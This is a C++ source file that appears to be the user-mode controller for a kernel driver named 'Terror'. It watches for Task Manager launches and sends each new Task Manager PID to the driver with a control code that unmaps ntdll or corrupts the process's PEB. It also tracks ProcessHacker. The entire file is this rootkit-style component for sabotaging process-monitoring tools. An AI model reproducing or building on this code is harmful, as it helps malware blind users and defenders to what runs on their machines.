#include "../defs.h"


//forward decs
bool CreateHandle();
DWORD GetProcess();


int main()
{

	if (!CreateHandle())
	{
		printf("failed to create handle:  %i\r\n", GetLastError());
	}


	while (true)
	{
		int code;
		std::cin >> code;

		if (code == 1)
		{
			ctlcode = IO_UNMAP_NTDLL;
			printf("Unmap ntdll\n");
			break;
		}
		else if (code == 2)
		{
			ctlcode = IO_CORRUPT_PEB;
			printf("PEB corruption\n");
			break;
		}
		else
		{
			printf("Wrong input\n");
		}
	}

	while (true)
	{
		GetProcess();

		Sleep(100);
	}


	CloseHandle(hDevice);

	system("PAUSE");


}

//get handle to the driver
bool CreateHandle()
{
	hDevice = CreateFileW(L"\\\\.\\Terror", GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);

	if (hDevice == INVALID_HANDLE_VALUE)
	{
		std::cout << "Handle creation failed\n";
		std::cin.get();
		return false;
	}

	std::cout << "Handle creation successful\n";

	return true;
}


//loop through the process list and if a target process is found, send the PID to the driver via the correct control code
DWORD GetProcess()
{
	HANDLE snapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (snapshotHandle == INVALID_HANDLE_VALUE)
	{
		return NULL;
	}

	PROCESSENTRY32W processEntry = { };
	processEntry.dwSize = sizeof(PROCESSENTRY32W);

	if (Process32FirstW(snapshotHandle, &processEntry))
	{

		do
		{
			if (_wcsicmp(processEntry.szExeFile, taskManagerName) == 0)
			{

				if (_wcsicmp(processEntry.szExeFile, taskManagerName) == 0)
				{
					DWORD pid = processEntry.th32ProcessID;

					if (taskmanagerPIDlist.find(pid) == taskmanagerPIDlist.end())
					{
						printf("[+] Task manager launched: %lu\n", pid);
						taskmanagerPIDlist.insert(pid);
						taskManagerPID = pid;

						if (!DeviceIoControl(hDevice, ctlcode, &pid, sizeof(pid), NULL, 0, NULL, NULL))
						{
							printf("DeviceIoControl failed for PID %lu with error %lu\n", pid, GetLastError());
						}

					}
				}

			}
			if (_wcsicmp(processEntry.szExeFile, processHackerName) == 0)
			{

				if (processHackerPID != processEntry.th32ProcessID)
				{
					printf("[+] ProcessHacker launched: %i\n", processEntry.th32ProcessID);
					processHackerPID = processEntry.th32ProcessID;
				}
			}

		} while (Process32NextW(snapshotHandle, &processEntry));
	}

	CloseHandle(snapshotHandle);
	return NULL;
}